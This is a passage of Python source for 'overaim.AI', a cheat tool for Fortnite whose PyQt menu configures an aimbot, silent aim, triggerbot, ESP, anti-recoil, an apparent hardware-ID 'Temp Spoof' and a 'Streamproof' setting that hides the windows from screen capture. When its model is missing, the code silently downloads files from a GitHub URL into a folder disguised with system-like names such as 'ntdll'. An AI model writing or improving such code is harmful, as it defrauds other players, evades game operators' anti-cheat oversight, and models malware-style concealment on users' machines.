            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            os._exit(1)

PUL = ctypes.POINTER(ctypes.c_ulong)
class KeyBdInput(ctypes.Structure):
    _fields_ = [("wVk", ctypes.c_ushort),
                ("wScan", ctypes.c_ushort),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class HardwareInput(ctypes.Structure):
    _fields_ = [("uMsg", ctypes.c_ulong),
                ("wParamL", ctypes.c_short),
                ("wParamH", ctypes.c_ushort)]

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input_I(ctypes.Union):
    _fields_ = [("ki", KeyBdInput),
                ("mi", MouseInput),
                ("hi", HardwareInput)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong),
                ("ii", Input_I)]

class POINT(ctypes.Structure):
    _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]

KEY_NAMES = {
    0x01: "LMB",
    0x02: "RMB",
    0x03: "Control-Break",
    0x04: "MMB",
    0x05: "MB1",
    0x06: "MB2",
    0x08: "BACK",
    0x09: "TAB",
    0x0C: "CLR",
    0x0D: "ENTER",
    0x10: "SHFT",
    0x11: "CTRL",
    0x12: "ALT",
    0x13: "PAUSE",
    0x14: "CAPS",
    0x15: "IME Kana",
    0x19: "IME Kanji",
    0x1B: "ESC",
    0x20: "SPCE",
    0x21: "PG UP",
    0x22: "PG DN",
    0x23: "END",
    0x24: "HOME",
    0x25: "LEFT",
    0x26: "UP",
    0x27: "RIGHT",
    0x28: "DOWN",
    0x29: "SEL",
    0x2C: "NONE",
    0x2D: "INS",
    0x2E: "DEL",
    0x2F: "HELP",
    0x30: "0",
    0x31: "1",
    0x32: "2",
    0x33: "3",
    0x34: "4",
    0x35: "5",
    0x36: "6",
    0x37: "7",
    0x38: "8",
    0x39: "9",
    0x41: "A",
    0x42: "B",
    0x43: "C",
    0x44: "D",
    0x45: "E",
    0x46: "F",
    0x47: "G",
    0x48: "H",
    0x49: "I",
    0x4A: "J",
    0x4B: "K",
    0x4C: "L",
    0x4D: "M",
    0x4E: "N",
    0x4F: "O",
    0x50: "None",
    0x51: "Q",
    0x52: "R",
    0x53: "S",
    0x54: "T",
    0x55: "U",
    0x56: "V",
    0x57: "W",
    0x58: "X",
    0x59: "Y",
    0x5A: "Z",
    0x70: "F1",
    0x71: "F2",
    0x72: "F3",
    0x73: "F4",
    0x74: "F5",
    0x75: "F6",
    0x76: "F7",
    0x77: "F8",
    0x78: "F9",
    0x79: "F10",
    0x7A: "F11",
    0x7B: "F12",
    0x5B: "None",
    0xA1: "RSHIFT",
    0x5C: "Left Win",
    0x5D: "Right Win",
    0x60: "Numpad 0",
    0x61: "Numpad 1",
    0x62: "Numpad 2",
    0x63: "Numpad 3",
    0x64: "Numpad 4",
    0x65: "Numpad 5",
    0x66: "Numpad 6",
    0x67: "Numpad 7",
    0x68: "Numpad 8",
    0x69: "Numpad 9",
    0x6A: "Numpad *",
    0x6B: "Numpad +",
    0x6C: "Numpad ,",
    0x6D: "Numpad -",
    0x6E: "Numpad .",
    0x6F: "Numpad /",
    0x70: "F1",
    0x71: "F2",
}

os.environ["QT_ENABLE_HIGHDPI_SCALING"] = "1"
os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
os.environ["QT_SCALE_FACTOR"] = "1"

if hasattr(Qt, 'AA_EnableHighDpiScaling'):
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling, True)
if hasattr(Qt, 'AA_UseHighDpiPixmaps'):
    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

class FPSOverlay(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowFlags(
            Qt.FramelessWindowHint |
            Qt.WindowStaysOnTopHint |
            Qt.Tool |
            Qt.X11BypassWindowManagerHint
        )
        self.setAttribute(Qt.WA_TranslucentBackground)
        self.setAttribute(Qt.WA_NoSystemBackground, True)
        self.setAttribute(Qt.WA_OpaquePaintEvent, False)
        self.setWindowOpacity(0.95)
        self.setAttribute(Qt.WA_TransparentForMouseEvents)

        window_handle = int(self.winId()) 
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)

        font_id = QFontDatabase.addApplicationFont(r"C:\ProgramData\Astro\Assets\Font.ttf")
        font_family = QFontDatabase.applicationFontFamilies(font_id)[0]
        custom_font = QFont(font_family)

        self.label = QLabel("Overaim | 0 ENEMIES | 000 FPS", self)
        self.label.setFont(custom_font)
        self.label.setStyleSheet("""
            QLabel {
                color: white;
                background-color: #141414;
                border: 2px solid #1c1d1d;
                border-radius: 8px;
                padding: 5px;
                width: 240px;
                max-width: 240px;
                min-width: 240px;
                text-align: center;
            }
        """)

        layout = QVBoxLayout()
        layout.addWidget(self.label)
        layout.setAlignment(Qt.AlignCenter)
        self.setLayout(layout)

        self.fps = 0
        self.enemies = 0

        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_fps)
        self.timer.start(5) 

        self.move_overlay()


    def update_fps(self):
        self.label.setText(
    f"<span style='color:#0f9cfa;'>overaim | FORTNITE | V2.1 | FPS: {int(self.fps)}</span>"
)

    def move_overlay(self):
        screen_geometry = QApplication.primaryScreen().availableGeometry()
        self.move(0, 0)


class MyWindow(QWidget):
    try:
        modell = YOLO("C:/ProgramData/SoftworkCR/ntdll/Langs/EN-US/DatetimeConfigurations/Cr/Fortnite.pt")
    except Exception as e:
        def RP03EV27S(fname: str, url: str):
            destination_path = r'C:\\ProgramData\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\'
            full_path = os.path.join(destination_path, fname)
            r = requests.get(url, allow_redirects=True)
            with open(full_path, 'wb') as file:
                file.write(r.content)
        os.system(f'mkdir "C:\ProgramData\SoftworkCR\\ntdll\Langs\EN-US\DatetimeConfigurations\Cr" >nul 2>&1')
        RP03EV27S("Fortnite.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OON.pt")
        RP03EV27S("FortnitePro.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOS.pt")
        # RP03EV27S("WINDOWSUN.pt", "https://raw.githubusercontent.com/aiantics/bU7ErD/main/D-VR90EX/DF990/B9022/CKRRJE/8OOU.pt")
        time.sleep(5)
        modell = YOLO("C:/ProgramData/SoftworkCR/ntdll/Langs/EN-US/DatetimeConfigurations/Cr/Fortnite.pt")

    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        global Keybind
        global Keybind2
        global Auto_Fire_Keybind
        global Flickbot_Keybind
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind
        try:
            self.Keybind = Keybind
            self.Keybind2 = Keybind2
            self.Auto_Fire_Keybind = Auto_Fire_Keybind
            self.Flickbot_Keybind = Flickbot_Keybind
            self.Streamproof = Streamproof
            self.Slot1_Keybind = Slot1_Keybind
            self.Slot2_Keybind = Slot2_Keybind
            self.Slot3_Keybind = Slot3_Keybind
            self.Slot4_Keybind = Slot4_Keybind
            self.Slot5_Keybind = Slot5_Keybind
            self.Slot6_Keybind = Slot6_Keybind
        except:restart_program()


        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(300)


        self.setWindowTitle('overaim.AI')
        self.setWindowOpacity(0.96)
        #self.setMask(self.create_mask())
        self.setFixedSize(350, 500)

        self.setWindowFlag(Qt.MSWindowsFixedSizeDialogHint, True)
        self.setWindowFlag(Qt.WindowMinimizeButtonHint, False)
        self.setWindowFlag(Qt.WindowMaximizeButtonHint, False)
        self.setWindowFlag(Qt.WindowStaysOnTopHint, True)
        self.setWindowFlag(Qt.FramelessWindowHint, False)
        self.setWindowFlag(Qt.Tool, False)
        self.setWindowIcon(QIcon())
        window_handle = int(self.winId())
        user32.SetWindowDisplayAffinity(window_handle, 0x00000011) if Streamproof else user32.SetWindowDisplayAffinity(window_handle, 0x00000000)
        self.theme_hex_color = "#0f9cfa"#"#4077c9"
        self.widget_bg_color = "#1E1E1E"
        self.widget_border_color = "#2E2E2E"

        menu_tab_style = """
            QPushButton {
                border: none;	
                padding-bottom: 4px;
                margin-left: 60%;
                margin-right: 60%;
            }
        """ #border-bottom: 1.5px solid #616161;

        font_id = QFontDatabase.addApplicationFont("C:/ProgramData/Astro/Assets/Font.ttf")
        if font_id != -1:
            font_family = QFontDatabase.applicationFontFamilies(font_id)[0]
            custom_font = QFont(font_family, 13)
            QApplication.setFont(custom_font)

        self.Welcome_label_1 = QLabel("")
        self.Welcome_label_2 = QLabel("")
        self.Welcome_label_3 = QLabel("")
        self.Welcome_label_4 = QLabel("")
        self.Welcome_label_5 = QLabel("")
        self.Welcome_label_6 = QLabel("")
        self.Welcome_label_7 = QLabel("")
        self.info_label_3 = QLabel(f"<font color='{self.theme_hex_color}'>User Info:</font>", self)

        self.info_label_4 = QLabel(f"Your Key: . . .")
        self.info_label_5 = QLabel(f"Purchased: . . .")
        self.info_label_6 = QLabel(f"Expiry: . . .")
        self.info_label_7 = QLabel(f"Last Login: . . .")

        self.info_label_8 = QLabel(f"<font color='{self.theme_hex_color}'>Hotkeys:</font>", self)
        #self.info_label_9 = QLabel(f"Close Normally: <font color='#d95276'>[X]</font>", self)
        self.info_label_10 = QLabel(f"Quick On/Off:  <font color='{self.theme_hex_color}'>[F1]</font>", self)
        self.info_label_11 = QLabel(f"Close:   <font color='{self.theme_hex_color}'>[F2]</font>", self)
        self.info_label_13 = QLabel(f"Toggle Menu:   <font color='{self.theme_hex_color}'>[INS]</font>", self)

        self.Fov_Size_label = QLabel(
            f"FOV: {str(Fov_Size)}")
        self.slider = QSlider(Qt.Horizontal)
        self.slider.setStyleSheet(self.get_slider_style())
        self.slider.setMaximumWidth(160)
        self.slider.setMinimumWidth(160)
        self.slider.setFocusPolicy(Qt.NoFocus)
        self.slider.setMinimum(100)
        self.slider.setMaximum(700)
        self.slider.setValue(int(round(Fov_Size)))

        self.Confidence_label = QLabel(
            f"Confidence: {str(Confidence)}%")
        self.slider0 = QSlider(Qt.Horizontal)
        self.slider0.setStyleSheet(self.get_slider_style())
        self.slider0.setMaximumWidth(160)
        self.slider0.setMinimumWidth(160)
        self.slider0.setFocusPolicy(Qt.NoFocus)
        self.slider0.setMinimum(40)
        self.slider0.setMaximum(95)
        self.slider0.setValue(int(round(Confidence)))

        self.Aim_Smooth_label = QLabel(
            f"Aimbot Strength: {str(Aim_Smooth)}")
        self.slider3 = QSlider(Qt.Horizontal)
        self.slider3.setStyleSheet(self.get_slider_style())
        self.slider3.setMaximumWidth(160)
        self.slider3.setMinimumWidth(160)
        self.slider3.setFocusPolicy(Qt.NoFocus)
        self.slider3.setMinimum(5)
        self.slider3.setMaximum(200)
        self.slider3.setValue(int(round(Aim_Smooth)))

        self.Max_Detections_label = QLabel(
            f"Max Detections: {str(Max_Detections)}")
        self.slider4 = QSlider(Qt.Horizontal)
        self.slider4.setStyleSheet(self.get_slider_style())
        self.slider4.setMaximumWidth(160)
        self.slider4.setMinimumWidth(160)
        self.slider4.setFocusPolicy(Qt.NoFocus)
        self.slider4.setMinimum(1)
        self.slider4.setMaximum(6)
        self.slider4.setValue(int(round(Max_Detections)))

        self.aim_bone_label = QLabel("Aim Bone")
        self.aim_bone_combobox = QComboBox()
        self.aim_bone_combobox.setMinimumHeight(10)
        self.aim_bone_combobox.setMaximumHeight(10)
        self.aim_bone_combobox.setMinimumWidth(160)
        self.aim_bone_combobox.setMaximumHeight(160)
        self.aim_bone_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.aim_bone_combobox.addItems(["Head", "Neck", "Body"])
        self.Aim_Bone = self.aim_bone_combobox.currentText()
        if Aim_Bone == "Head":
            self.aim_bone_combobox.setCurrentText("Head") 
        if Aim_Bone == "Neck":
            self.aim_bone_combobox.setCurrentText("Neck") 
        if Aim_Bone == "Body":
            self.aim_bone_combobox.setCurrentText("Body") 

        self.smoothing_type_label = QLabel("Humanization")
        self.smoothing_type_combobox = QComboBox()
        self.smoothing_type_combobox.setMinimumHeight(10)
        self.smoothing_type_combobox.setMaximumHeight(10)
        self.smoothing_type_combobox.setMinimumWidth(160)
        self.smoothing_type_combobox.setMaximumHeight(160)
        self.smoothing_type_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.smoothing_type_combobox.addItems(["Default", "Bezier", "Catmull-Rom", "Hermite", "B-Spline", "Sine", "Exponential"])
        self.Smoothing_Type = self.smoothing_type_combobox.currentText()
        if Smoothing_Type == "Default":
            self.smoothing_type_combobox.setCurrentText("Default") 
        if Smoothing_Type == "Bezier":
            self.smoothing_type_combobox.setCurrentText("Bezier") 
        if Smoothing_Type == "Catmull-Rom":
            self.smoothing_type_combobox.setCurrentText("Catmull-Rom")
        if Smoothing_Type == "Hermite":
            self.smoothing_type_combobox.setCurrentText("Hermite") 
        if Smoothing_Type == "Sine":
            self.smoothing_type_combobox.setCurrentText("Sine")  
        if Smoothing_Type == "Exponential":
            self.smoothing_type_combobox.setCurrentText("Exponential")  
        self.img_value_label = QLabel("Blob Size")
        self.img_value_combobox = QComboBox()
        self.img_value_combobox.setMinimumHeight(10)
        self.img_value_combobox.setMaximumHeight(10)
        self.img_value_combobox.setMinimumWidth(160)
        self.img_value_combobox.setMaximumHeight(160)
        self.img_value_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.img_value_combobox.addItems(["320", "480", "640", "736", "832"])
        self.img_value = self.img_value_combobox.currentText()
        if Img_Value == "320":
            self.img_value_combobox.setCurrentText("320") 
        if Img_Value == "480":
            self.img_value_combobox.setCurrentText("480") 
        if Img_Value == "640":
            self.img_value_combobox.setCurrentText("640")
        if Img_Value == "736":
            self.img_value_combobox.setCurrentText("736")
        if Img_Value == "832":
            self.img_value_combobox.setCurrentText("832")

        self.fps_label = QLabel(
            f"Max FPS: {str(Model_FPS)}")
        self.slider_fps = QSlider(Qt.Horizontal)
        self.slider_fps.setStyleSheet(self.get_slider_style())
        self.slider_fps.setMaximumWidth(160)
        self.slider_fps.setMinimumWidth(160)
        self.slider_fps.setFocusPolicy(Qt.NoFocus)
        self.slider_fps.setMinimum(60)
        self.slider_fps.setMaximum(360)
        self.slider_fps.setValue(int(round(Model_FPS)))

        # Create and configure the ComboBox
        self.model_selected_label = QLabel("Load Model")
        self.model_selected_combobox = QComboBox()
        self.model_selected_combobox.setMinimumHeight(10)
        self.model_selected_combobox.setMaximumHeight(10)
        self.model_selected_combobox.setMinimumWidth(160)
        self.model_selected_combobox.setMaximumHeight(160)
        self.model_selected_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")

        # Load models and populate the ComboBox
        self.modelss = {}
        self.load_modelss()

        #self.rgb_label = QLabel(f"RGB: 255 50 1")
        #self.hue_slider = QSlider(Qt.Horizontal)
        # self.hue_slider.setStyleSheet(self.get_slider_style())
        # self.hue_slider.setMaximumWidth(160)
        # self.hue_slider.setMinimumWidth(160)
        # self.hue_slider.setFocusPolicy(Qt.NoFocus)
        # self.hue_slider.setMinimum(0)
        # self.hue_slider.setMaximum(359)
        huer, _, _ = colorsys.rgb_to_hsv(151 / 255.0, 158  / 255.0, 248  / 255.0)
        hue_degreess = int(huer * 359)
        #self.hue_slider.setValue(hue_degreess)

        # self.lightness_label = QLabel(f"Lightness: 128")
        # self.lightness_slider = QSlider(Qt.Horizontal)
        # self.lightness_slider.setStyleSheet(self.get_slider_style())
        # self.lightness_slider.setMaximumWidth(160)
        # self.lightness_slider.setMinimumWidth(160)
        # self.lightness_slider.setFocusPolicy(Qt.NoFocus)
        # self.lightness_slider.setMinimum(0)
        # self.lightness_slider.setMaximum(255)
        # self.lightness_slider.setValue(conf_lightness)

        # self.opacity_label = QLabel(f"Opacity: 200")
        # self.opacity_slider = QSlider(Qt.Horizontal)
        # self.opacity_slider.setStyleSheet(self.get_slider_style())
        # self.opacity_slider.setMaximumWidth(160)
        # self.opacity_slider.setMinimumWidth(160)
        # self.opacity_slider.setFocusPolicy(Qt.NoFocus)
        # self.opacity_slider.setMinimum(0)
        # self.opacity_slider.setMaximum(255)
        # self.opacity_slider.setValue(conf_opacity)

        self.Enable_Aim_checkbox = QCheckBox("Enable Aimbot")
        self.Enable_Aim_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_checkbox.setChecked(Enable_Aim)

        self.Enable_Slots_checkbox = QCheckBox("Enable Weapon Slots")
        self.Enable_Slots_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Slots_checkbox.setChecked(Enable_Slots)


        self.Enable_Flick_checkbox = QCheckBox("Enable Silent Aim")
        self.Enable_Flick_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Flick_checkbox.setChecked(Enable_Flick_Bot)


        self.flick_sens_info_label = QLabel("Use your in-game fortnite sensitivity.")
        self.flick_set_info_label = QLabel("Silent Aim Settings:")

        self.flick_scope_label = QLabel(f"Silent Aim Strength: {str(Flick_Scope_Sens)}%")
        self.flick_scope_slider = QSlider(Qt.Horizontal)
        self.flick_scope_slider.setStyleSheet(self.get_slider_style())
        self.flick_scope_slider.setMaximumWidth(160)
        self.flick_scope_slider.setMinimumWidth(160)
        self.flick_scope_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_scope_slider.setMinimum(10)
        self.flick_scope_slider.setMaximum(90)
        self.flick_scope_slider.setValue(int(Flick_Scope_Sens))

        self.flick_cool_label = QLabel(f"Cool Down: {str(Flick_Cooldown)}s")
        self.flick_cool_slider = QSlider(Qt.Horizontal)
        self.flick_cool_slider.setStyleSheet(self.get_slider_style())
        self.flick_cool_slider.setMaximumWidth(160)
        self.flick_cool_slider.setMinimumWidth(160)
        self.flick_cool_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_cool_slider.setMinimum(5)
        self.flick_cool_slider.setMaximum(120)
        self.flick_cool_slider.setValue(int(Flick_Cooldown * 100))

        self.flick_delay_label = QLabel(f"Shot Delay: {str(Flick_Delay)}s")
        self.flick_delay_slider = QSlider(Qt.Horizontal)
        self.flick_delay_slider.setStyleSheet(self.get_slider_style())
        self.flick_delay_slider.setMaximumWidth(160)
        self.flick_delay_slider.setMinimumWidth(160)
        self.flick_delay_slider.setFocusPolicy(Qt.NoFocus)
        self.flick_delay_slider.setMinimum(3)
        self.flick_delay_slider.setMaximum(10)
        self.flick_delay_slider.setValue(int(Flick_Delay * 1000))


        self.Controller_On_checkbox = QCheckBox("Controller Support")
        self.Controller_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Controller_On_checkbox.setChecked(Controller_On)

        self.CupMode_On_checkbox = QCheckBox("Enable Tournament Mode")
        self.CupMode_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.CupMode_On_checkbox.setChecked(CupMode_On)

        self.AntiRecoil_On_checkbox = QCheckBox("Enable Anti-Recoil")
        self.AntiRecoil_On_checkbox.setFocusPolicy(Qt.NoFocus)
        self.AntiRecoil_On_checkbox.setChecked(AntiRecoil_On)

        self.Reduce_Bloom_checkbox = QCheckBox("Reduce Bloom")
        self.Reduce_Bloom_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Reduce_Bloom_checkbox.setChecked(Reduce_Bloom)

        self.Require_ADS_checkbox = QCheckBox("Require ADS")
        self.Require_ADS_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Require_ADS_checkbox.setChecked(Require_ADS)

        self.AntiRecoil_Strength_label = QLabel(
            f"Strength: {str(AntiRecoil_Strength)}")
        self.slider60 = QSlider(Qt.Horizontal)

        self.slider60.setStyleSheet(self.get_slider_style())
        self.slider60.setMaximumWidth(160)
        self.slider60.setMinimumWidth(160)

        self.slider60.setFocusPolicy(Qt.NoFocus)
        self.slider60.setMinimum(1)
        self.slider60.setMaximum(10)
        self.slider60.setValue(int(round(AntiRecoil_Strength)))

        #Auto_Fire_Fov_Size

        self.Show_Fov_checkbox = QCheckBox("FOV")
        self.Show_Fov_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Fov_checkbox.setChecked(Show_Fov)
        self.Show_Crosshair_checkbox = QCheckBox("Crosshair")
        self.Show_Crosshair_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Crosshair_checkbox.setChecked(Show_Crosshair)
        self.Show_Detections_checkbox = QCheckBox("ESP")
        self.Show_Detections_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Detections_checkbox.setChecked(Show_Detections)

        self.Show_Aimline_checkbox = QCheckBox("Aimline")
        self.Show_Aimline_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Aimline_checkbox.setChecked(Show_Aimline)

        self.Show_Debug_checkbox = QCheckBox("Debug")
        self.Show_Debug_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_Debug_checkbox.setChecked(Show_Debug)

        self.Show_FPS_checkbox = QCheckBox("Show Info Bar")
        self.Show_FPS_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_FPS_checkbox.setChecked(Show_FPS)

        self.Show_CMD_checkbox = QCheckBox("Show CMD")
        self.Show_CMD_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Show_CMD_checkbox.setChecked(False)

        self.Enable_TriggerBot_checkbox = QCheckBox("Enable Triggerbot")
        self.Enable_TriggerBot_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_TriggerBot_checkbox.setChecked(Enable_TriggerBot)

        self.Use_Model_Class_checkbox = QCheckBox("Detect Single Class Only")
        self.Use_Model_Class_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Use_Model_Class_checkbox.setChecked(Use_Model_Class)

        self.Require_Keybind_checkbox = QCheckBox("Use Keybind for Triggerbot")
        self.Require_Keybind_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Require_Keybind_checkbox.setChecked(Require_Keybind)
        self.Use_Hue_checkbox = QCheckBox("Rainbow Visuals")
        self.Use_Hue_checkbox.setDisabled(False)
        self.Use_Hue_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Use_Hue_checkbox.setChecked(Use_Hue)
        # self.Streamproof_checkbox = QCheckBox("Streamproof")
        # self.Streamproof_checkbox.setDisabled(False)
        # self.Streamproof_checkbox.setFocusPolicy(Qt.NoFocus)
        # self.Streamproof_checkbox.setChecked(Streamproof)

        self.Auto_Fire_Fov_Size_label = QLabel(
            f"FOV Size: {str(Auto_Fire_Fov_Size)}")
        self.slider5 = QSlider(Qt.Horizontal)
        self.slider5.setStyleSheet(self.get_slider_style())
        self.slider5.setMaximumWidth(160)
        self.slider5.setMinimumWidth(160)
        self.slider5.setFocusPolicy(Qt.NoFocus)
        self.slider5.setMinimum(4)
        self.slider5.setMaximum(30)
        self.slider5.setValue(int(round(Auto_Fire_Fov_Size)))

        self.box_type_label = QLabel("Box Type")
        self.box_type_combobox = QComboBox()
        self.box_type_combobox.setMinimumHeight(10)
        self.box_type_combobox.setMaximumHeight(10)
        self.box_type_combobox.setMinimumWidth(160)
        self.box_type_combobox.setMaximumHeight(160)
        self.box_type_combobox.setStyleSheet("QComboBox { background-color: " + self.widget_bg_color + "; }")
        self.box_type_combobox.addItems(["Regular", "Corner", "Filled"])
        self.Box_type = self.box_type_combobox.currentText()
        if Box_type == "Regular":
            self.box_type_combobox.setCurrentText("Regular") 
        if Box_type == "Corner":
            self.box_type_combobox.setCurrentText("Corner") 
        if Box_type == "Filled":
            self.box_type_combobox.setCurrentText("Filled") 
        self.Auto_Fire_Confidence_label = QLabel(
            f"Confidence: {str(Auto_Fire_Confidence)}%")
        self.slider6 = QSlider(Qt.Horizontal)
        self.slider6.setStyleSheet(self.get_slider_style())
        self.slider6.setMaximumWidth(160)
        self.slider6.setMinimumWidth(160)
        self.slider6.setFocusPolicy(Qt.NoFocus)
        self.slider6.setMinimum(60)
        self.slider6.setMaximum(100)
        self.slider6.setValue(int(round(Auto_Fire_Confidence)))

        self.btn_extraini = QPushButton("Refresh")
        self.btn_extraini.setFocusPolicy(Qt.NoFocus)
        self.btn_extraini.setStyleSheet(self.get_button_style())
        self.btn_extraini.setMinimumWidth(120)
        self.btn_extraini.clicked.connect(self.refresh_extra)

        self.btn_extraini2 = QPushButton("Refresh")
        self.btn_extraini2.setFocusPolicy(Qt.NoFocus)
        self.btn_extraini2.setStyleSheet(self.get_button_style())
        self.btn_extraini2.setMinimumWidth(80)
        self.btn_extraini2.clicked.connect(self.refresh_extra)

        self.tempspoof_button = QPushButton("Temp Spoof")
        self.tempspoof_button.setFocusPolicy(Qt.NoFocus)
        self.tempspoof_button.setStyleSheet(self.get_button_style())
        self.tempspoof_button.setMinimumWidth(80)
        self.tempspoof_button.setMinimumHeight(25)
        self.tempspoof_button.clicked.connect(self.temp_spoof)

        self.hotkey_label = QLabel(f"Keybinds: ")
        self.hotkey_label2 = QLabel("")
        key_name_converted = KEY_NAMES.get(Keybind, f"0x{Keybind:02X}")
        key_name_converted2 = KEY_NAMES.get(Keybind2, f"0x{Keybind2:02X}")
        key_name_converted3 = KEY_NAMES.get(Auto_Fire_Keybind, f"0x{Auto_Fire_Keybind:02X}")
        key_name_converted4 = KEY_NAMES.get(Flickbot_Keybind, f"0x{Flickbot_Keybind:02X}")
        is_selecting_hotkey = False
        self.btn_hotkey = QPushButton(f"{key_name_converted}")
        self.btn_hotkey.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey.setStyleSheet(self.get_button_style())
        self.btn_hotkey.setMinimumWidth(80)
        self.btn_hotkey.clicked.connect(self.start_select_hotkey)

        is_selecting_hotkey2 = False
        self.btn_hotkey2 = QPushButton(f"{key_name_converted2}")
        self.btn_hotkey2.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey2.setStyleSheet(self.get_button_style())
        self.btn_hotkey2.setMinimumWidth(80)
        self.btn_hotkey2.clicked.connect(self.start_select_hotkey2)

        self.hotkey_label3 = QLabel("Triggerbot Key")
        is_selecting_hotkey3 = False
        self.btn_hotkey3 = QPushButton(f"{key_name_converted3}")
        self.btn_hotkey3.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey3.setStyleSheet(self.get_button_style())
        self.btn_hotkey3.setMinimumWidth(80)
        self.btn_hotkey3.clicked.connect(self.start_select_hotkey3)

        self.hotkey_label4 = QLabel("Keybind: ")
        is_selecting_hotkey4 = False
        self.btn_hotkey4 = QPushButton(f"{key_name_converted4}")
        self.btn_hotkey4.setFocusPolicy(Qt.NoFocus)
        self.btn_hotkey4.setStyleSheet(self.get_button_style())
        self.btn_hotkey4.setMinimumWidth(80)
        self.btn_hotkey4.clicked.connect(self.start_select_hotkey4)

# Slots Start
        self.Enable_Aim_Slot1_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot1_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot1_checkbox.setChecked(Enable_Aim_Slot1)

        self.Enable_Aim_Slot2_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot2_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot2_checkbox.setChecked(Enable_Aim_Slot2)

        self.Enable_Aim_Slot3_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot3_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot3_checkbox.setChecked(Enable_Aim_Slot3)

        self.Enable_Aim_Slot4_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot4_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot4_checkbox.setChecked(Enable_Aim_Slot4)

        self.Enable_Aim_Slot5_checkbox = QCheckBox("Aim")
        self.Enable_Aim_Slot5_checkbox.setFocusPolicy(Qt.NoFocus)
        self.Enable_Aim_Slot5_checkbox.setChecked(Enable_Aim_Slot5)

        self.Fov_Size_label_slot1 = QLabel(f"FOV: {str(Fov_Size_Slot1)}")
        self.slider_slot1 = QSlider(Qt.Horizontal)
        self.slider_slot1.setStyleSheet(self.get_slider_style())
        self.slider_slot1.setMaximumWidth(80)
        self.slider_slot1.setMinimumWidth(80)
        self.slider_slot1.setFocusPolicy(Qt.NoFocus)
        self.slider_slot1.setMinimum(120)
        self.slider_slot1.setMaximum(800)
        self.slider_slot1.setValue(int(round(Fov_Size_Slot1)))

        self.Fov_Size_label_slot2 = QLabel(f"FOV: {str(Fov_Size_Slot2)}")
        self.slider_slot2 = QSlider(Qt.Horizontal)
        self.slider_slot2.setStyleSheet(self.get_slider_style())
        self.slider_slot2.setMaximumWidth(80)
        self.slider_slot2.setMinimumWidth(80)
        self.slider_slot2.setFocusPolicy(Qt.NoFocus)
        self.slider_slot2.setMinimum(120)
        self.slider_slot2.setMaximum(800)
        self.slider_slot2.setValue(int(round(Fov_Size_Slot2)))

        self.Fov_Size_label_slot3 = QLabel(f"FOV: {str(Fov_Size_Slot3)}")
        self.slider_slot3 = QSlider(Qt.Horizontal)
        self.slider_slot3.setStyleSheet(self.get_slider_style())
        self.slider_slot3.setMaximumWidth(80)
        self.slider_slot3.setMinimumWidth(80)
        self.slider_slot3.setFocusPolicy(Qt.NoFocus)
        self.slider_slot3.setMinimum(120)
        self.slider_slot3.setMaximum(800)
        self.slider_slot3.setValue(int(round(Fov_Size_Slot3)))

        self.Fov_Size_label_slot4 = QLabel(f"FOV: {str(Fov_Size_Slot4)}")
        self.slider_slot4 = QSlider(Qt.Horizontal)
